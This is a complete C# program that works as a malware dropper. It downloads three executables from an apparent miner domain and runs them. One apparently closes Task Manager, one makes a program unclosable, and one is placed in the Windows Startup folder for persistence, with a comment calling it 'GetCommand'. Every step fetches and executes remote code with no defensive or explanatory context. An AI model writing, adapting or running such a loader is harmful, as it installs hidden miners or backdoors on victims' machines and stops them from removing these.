using System;
using System.Diagnostics;
using System.Net;

namespace DownloadToFile
{
    internal class Program
    {
        private static readonly WebClient Client = new WebClient();

        public static void Main(string[] args)
        {
            //get Taskmanager closer
            Console.WriteLine(Environment.GetFolderPath(Environment.SpecialFolder.Templates));
            Client.DownloadFile("http://reisminer.xyz/exes/Taskmanager.exe",
                Environment.GetFolderPath(Environment.SpecialFolder.Templates) + @"\Taskmanager.exe");
            Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + @"\Taskmanager.exe");

            //get MakeUnClosable
            Client.DownloadFile("http://reisminer.xyz/exes/MakeProgramUnclosable.exe",
                Environment.GetFolderPath(Environment.SpecialFolder.Templates) + @"\MakeUnclosable.exe");
            Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + @"\MakeUnclosable.exe");
            
            //get GetCommand
            Console.WriteLine(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
            Client.DownloadFile("http://reisminer.xyz/exes/sqhost.exe",
                Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\sqhost.exe");
            Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\sqhost.exe");
        }
    }
}